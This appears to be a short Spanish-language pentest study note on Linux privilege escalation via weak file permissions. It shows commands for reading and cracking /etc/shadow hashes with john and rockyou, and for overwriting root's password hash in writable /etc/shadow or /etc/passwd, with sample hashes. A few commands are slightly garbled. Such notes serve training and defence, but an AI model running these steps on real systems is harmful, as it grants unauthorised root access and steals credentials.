# Weak File permissions

## Readable /etc/shadow

La forma de conseguir una password es revisar el etc/shadow que podría contener los password hashes ,estos se puede usar para conseguir la password de root. Normalmente sólo puede leerlo el usuario root.

`cat /etc/shadow`&#x20;

`root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxkI0:17298:0:99999:7:::`

Para conseguir la password debemos crear un archivo que contenga el hashe luego usar john :

`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxkI0`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

## Writable /etc/shadow

Si el archivo /etc/shadow se puede editar como usuario .Podemos generar una password hash y editar el archivo shadow.

`mkpasswd -m sha-512 root`&#x20;

`$6$P1LBzL29kpCQkf$pqry9A70tR9UQH3UdWdxZb9x8n8J6A92BP2eKFeEBg2Yw9x4YOMBbrr27tTDaHDyUPQ8flyFyKLnUaonbph8Z/`

El hash generado lo cambiamos en root.

`root:$6$E3A8UKtXdLFv0iQY$XmQl5WHRFTIc2K5GsiJNNQqJz4tjGDku09dIR4Vy0dr7VjTe3xCS7OmN5XMrFmQd02BlGamHao7/ji5Ozn0cN1:17298:0:99999:7:::`

`su root`&#x20;

`whoami > root`

## Writable /etc/passwd

El archivo /etc/passwd también tiene información de los usuario ,como el paso anterior se puede generar una nueva password pero ahora de otra forma para el archivo passwd:&#x20;

`openssl passwd super`&#x20;

`JLf6kBvhmX.zQ`

Se debe editar el archivo passwd en el usuario root .&#x20;

`root:x0:0:root:/root:/bin/bash`

Se debe cambiar la x por la pasword generada.&#x20;

`root:JLf6kBvhmX.zQ:0:0:root:/root:/bin/bash su root`
